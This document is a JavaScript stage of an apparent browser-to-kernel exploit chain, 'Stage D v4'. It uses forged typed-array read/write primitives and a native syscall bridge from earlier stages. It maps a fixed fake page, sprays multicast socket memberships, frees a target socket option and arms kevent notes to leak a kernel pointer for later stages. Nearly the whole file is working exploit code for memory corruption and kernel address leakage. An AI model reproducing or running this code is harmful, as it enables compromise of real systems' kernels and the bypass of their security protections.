// Stage D v4: replicate the allocation order that worked, in one probe.
//
// On the previous boot the leak appeared only after a first, "wrong" join
// pass (group 251.255.255.239, source 64.0.2.1) had run before the corrected
// pass (group 239.255.255.249, source 192.0.2.1). Every socket therefore had
// three memberships when the knote was planted. A clean single pass left
// fake+0x50 at zero through three arm cycles.
//
// This probe performs both passes in order:
//
//   prime: anchor + victims join 239.255.255.250 and 251.255.255.239,
//          free the target, arm, walk (expected to fail);
//   real:  anchor + victims join 239.255.255.250 (already) and
//          239.255.255.249, free the target, arm, walk -> leak.
//
// A leak in the prime pass is also accepted. All joins tolerate EADDRINUSE
// (48) so the probe is re-runnable.
var result, n, f, dv, saved, phase = "preflight";
var st = null, fake = 0, page = 0, mapped = 0;
var forged = null, carrier = null, carrierSlot = -1, carrierOriginal = null;
var MAPLEN = 16384;
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a || !state.view ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !Number.isInteger(state.index))
    throw new Error("caller_missing");
  st = window.__fw14StageC;
  if (!st || typeof st.kq !== "number" || typeof st.dce !== "number" ||
      typeof st.targetFd !== "number" || !Array.isArray(st.victims) ||
      st.victims.length !== 96 || typeof st.anchor !== "number")
    throw new Error("stage_c_state_missing");
  var need = ["open", "close", "setsockopt", "getsockopt", "kevent", "getpid", "sys477"];
  var missing = [];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number") missing.push(need[mi]);
  if (missing.length) throw new Error("wrappers_missing:" + missing.join(","));
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x1000));

  fake = st.fake;
  page = st.page;

  forged = state.view;
  carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  function bytesAt(index, count) {
    var out = [];
    for (var i = 0; i < count; i++) out.push(forged[index + i]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var i = bytes.length - 1; i >= 0; i--)
      value = value * 256 + bytes[i];
    return value;
  }
  function pointerBytes(value) {
    var out = [];
    for (var i = 0; i < 8; i++)
      out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  carrierOriginal = bytesAt(carrierSlot, 8);
  function setCarrier(addr) {
    var next = pointerBytes(addr);
    for (var i = 0; i < 8; i++) forged[carrierSlot + i] = next[i];
  }
  function restoreCarrier() {
    for (var i = 0; i < 8; i++)
      forged[carrierSlot + i] = carrierOriginal[i];
  }
  function poke(addr, bytes) {
    setCarrier(addr);
    for (var i = 0; i < bytes.length; i++) carrier[i] = bytes[i];
    restoreCarrier();
  }
  function peek(addr, count) {
    setCarrier(addr);
    var out = [];
    for (var i = 0; i < count; i++) out.push(carrier[i]);
    restoreCarrier();
    return out;
  }
  function peekLong(addr) { return valueOf(peek(addr, 8)); }
  function peekU32(addr) { return valueOf(peek(addr, 4)); }
  function pokeLong(addr, value) { poke(addr, pointerBytes(value)); }
  function pokeU32(addr, value) {
    poke(addr, [value & 255, (value >>> 8) & 255,
                (value >>> 16) & 255, (value >>> 24) & 255]);
  }
  function pokeU16(addr, value) {
    poke(addr, [value & 255, (value >>> 8) & 255]);
  }
  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function errnoOf(r) { return isErr(r) ? n.readErrno() : null; }
  function eTag(r) {
    if (!isErr(r)) return "v" + r.value;
    var e = n.readErrno();
    return "e" + (e === null ? r.value : e);
  }
  function mark(m) {
    if (typeof api !== "undefined" && api && typeof api.markSync === "function")
      api.markSync(m);
  }
  function hex8(v) { return ("00000000" + (v >>> 0).toString(16)).slice(-8); }
  function kptr(v) {
    return v !== 0 && Math.floor(v / 0x1000000000000) === 0xffff;
  }

  var pidRes = n.call("getpid", []);
  if (pidRes.high !== 0 || pidRes.value < 1 || pidRes.value > 100000)
    throw new Error("pid_invalid");
  var pid = pidRes.value;

  // ------------------------------------------------------- fake page
  phase = "mmap";
  mark("d4_mmap");
  fake = (((st.dce & 0xffff) << 16) | 0x9800) >>> 0;
  page = fake & 0xffffc000;
  mapped = n.call("sys477", [page, MAPLEN, 3, 0x1012, 0xffffffff, 0]);
  var mmapTag = "fake=0x" + hex8(fake) + "/page=0x" + hex8(page) +
    "/rc=" + (isErr(mapped) ? "e" + (errnoOf(mapped) === null ?
      mapped.value : errnoOf(mapped)) : "0x" + hex8(mapped.value));
  if (isErr(mapped) || mapped.value !== page)
    throw new Error("mmap_fixed_" + mmapTag);

  function layout() {
    poke(page, new Uint8Array(MAPLEN));
    pokeU32(fake + 16, 0xf9ffffef);
    pokeLong(fake + 24, fake + 512);
    pokeU32(fake + 640, 8);
    pokeLong(fake + 32, fake + 768);
    pokeLong(fake + 800, fake + 1024);
    pokeLong(fake + 1880, fake + 2048);
    pokeLong(fake + 2056, fake + 2304);
    pokeU32(fake + 56, 2);
    pokeLong(fake + 80, 0);
    pokeLong(fake + 88, 0);
    pokeU16(fake + 180, 2);
    pokeU16(fake + 190, 2);
  }
  layout();

  // payloads
  f.fill(0, 0x600, 0x6c0);
  f[0x600] = 0xef; f[0x601] = 0xff; f[0x602] = 0xff; f[0x603] = 0xfa; // 250
  f[0x620] = 0xef; f[0x621] = 0xff; f[0x622] = 0xff; f[0x623] = 0xfb; // 251 prime
  f[0x660] = 0xef; f[0x661] = 0xff; f[0x662] = 0xff; f[0x663] = 0xf9; // 249 real
  // prime block-source: group 251, source 64.0.2.1
  f[0x640] = 0xef; f[0x641] = 0xff; f[0x642] = 0xff; f[0x643] = 0xfb;
  f[0x644] = 0x40; f[0x645] = 0x00; f[0x646] = 0x02; f[0x647] = 0x01;
  // real block-source: group 249, source 192.0.2.1
  f[0x680] = 0xef; f[0x681] = 0xff; f[0x682] = 0xff; f[0x683] = 0xf9;
  f[0x684] = 0xc0; f[0x685] = 0x00; f[0x686] = 0x02; f[0x687] = 0x01;

  function join(fd, off, tolerate) {
    var r = n.call("setsockopt", [fd, 0, 12, n.frameAddress + off, 8, 0]);
    if (r.value === 0) return 0;
    var e = errnoOf(r);
    if (tolerate && e === tolerate) return 0;
    return e === null ? r.value : e;
  }
  function joinPass(g1, g2, tolerate) {
    var fail = "";
    var e = join(st.anchor, g1, tolerate);
    if (e) fail = "a1e" + e;
    if (!fail) { e = join(st.anchor, g2, tolerate); if (e) fail = "a2e" + e; }
    var ok = 0;
    for (var vi = 0; vi < st.victims.length && !fail; vi++) {
      e = join(st.victims[vi], g1, tolerate);
      if (e) { fail = "j1_" + vi + "e" + e; break; }
      e = join(st.victims[vi], g2, tolerate);
      if (e) { fail = "j2_" + vi + "e" + e; break; }
      ok++;
    }
    return { ok: ok, fail: fail };
  }
  function freeTarget() {
    var r = n.call("setsockopt", [st.targetFd, 41, 51, 0, 0, 0]);
    return eTag(r);
  }
  function arm(ident, flags, data) {
    f.fill(0, 0x900, 0x940);
    dv.setUint32(0x900, ident >>> 0, true);
    dv.setUint32(0x904, 0, true);
    dv.setInt16(0x908, -18, true);
    dv.setUint16(0x90a, flags, true);
    dv.setInt32(0x910, data, true);
    dv.setInt32(0x914, 0, true);
    return n.call("kevent", [st.kq, n.frameAddress + 0x900, 1, 0, 0, 0]);
  }
  function walk(payloadOff, srcByte) {
    f[payloadOff + 7] = srcByte;
    var found = -1, kva = 0, count = 0, noncanon = "", refMut = -1;
    var setErr = "";
    for (var wi = 0; wi < st.victims.length; wi++) {
      var g = n.call("setsockopt",
        [st.victims[wi], 0, 72, n.frameAddress + payloadOff, 12, 0]);
      if (g.value !== 0 && !setErr) setErr = "s72@" + wi + eTag(g);
      var root = peekLong(fake + 80);
      var ref = peekU32(fake + 56);
      if (ref !== 2) { refMut = wi; break; }
      if (kptr(root)) { found = wi; kva = root; count = peekLong(fake + 88); break; }
      if (root !== 0) { noncanon = "t" + wi + ":0x" + hex8(root); break; }
    }
    return { found: found, kva: kva, count: count, noncanon: noncanon,
             refMut: refMut, setErr: setErr };
  }
  function armCycle() {
    arm(st.dce, 2, 0);
    return eTag(arm(st.dce, 1, 0));
  }

  var found = -1, kva = 0, count = 0;
  var primeTag = "-", realTag = "-";

  // ------------------------------------------------------- prime pass
  phase = "prime";
  mark("d4_prime");
  var primeJoin = joinPass(0x600, 0x620, 48);
  var primeFree = freeTarget();
  layout();
  var primeArm = armCycle();
  var p = walk(0x640, 12);
  primeTag = "j" + primeJoin.ok + (primeJoin.fail ? "/" + primeJoin.fail : "") +
    "/f" + primeFree + "/" + primeArm +
    (p.found >= 0 ? "/HIT" : (p.refMut >= 0 ? "/ref" : (p.noncanon ? "/" + p.noncanon :
      (p.setErr ? "/" + p.setErr : "/0"))));
  if (p.found >= 0) { found = p.found; kva = p.kva; count = p.count; }

  // -------------------------------------------------------- real pass
  if (found < 0) {
    phase = "real";
    mark("d4_real");
    var realJoin = joinPass(0x600, 0x660, 48);
    var realFree = freeTarget();
    layout();
    var realArm = armCycle();
    var r = walk(0x680, 12);
    realTag = "j" + realJoin.ok + (realJoin.fail ? "/" + realJoin.fail : "") +
      "/f" + realFree + "/" + realArm +
      (r.found >= 0 ? "/HIT" : (r.refMut >= 0 ? "/ref" : (r.noncanon ? "/" + r.noncanon :
        (r.setErr ? "/" + r.setErr : "/0"))));
    if (r.found >= 0) { found = r.found; kva = r.kva; count = r.count; }
  }

  // ---------------------------------------------------------- outcome
  phase = "outcome";
  for (var ri = 0; ri < saved.length; ri++) f[0x200 + ri] = saved[ri];
  saved = null;
  var post = n.call("getpid", []);
  var intact = post.value === pid && post.high === 0 &&
    state.array[0] === state.a &&
    bytesAt(carrierSlot, 8).join(",") === carrierOriginal.join(",");

  var leakTag = found >= 0 ?
    ("v" + found + "/fd" + st.victims[found] + "/kva=0x" + hex8(kva) +
     "/n=" + count) : "none";

  if (found >= 0) {
    window.__fw14StageD = {
      fake: fake,
      page: page,
      victimIndex: found,
      victimFd: st.victims[found],
      kva: kva,
      count: count,
      kq: st.kq,
      dce: st.dce,
      targetFd: st.targetFd,
      spray: st.spray.slice(),
      victims: st.victims.slice(),
      anchor: st.anchor,
      pid: pid
    };
  }
  result = {
    id: "stage_d_fake_v4",
    status: found >= 0 ? (intact ? "pass" : "fail") : "fail",
    details: {
      pid: pid,
      mmap: mmapTag,
      prime: primeTag.slice(0, 240),
      real: realTag.slice(0, 240),
      leak: leakTag,
      state: found >= 0 ? "held" : "failed",
      intact: intact
    }
  };
} catch (e) {
  result = {
    id: "stage_d_fake_v4",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 220) }
  };
} finally {
  try { if (forged && carrierSlot >= 0 && carrierOriginal)
    for (var ci = 0; ci < 8; ci++)
      forged[carrierSlot + ci] = carrierOriginal[ci]; } catch (ignore) {}
  if (f && saved)
    for (var fi = 0; fi < saved.length; fi++) f[0x200 + fi] = saved[fi];
}
return [result];
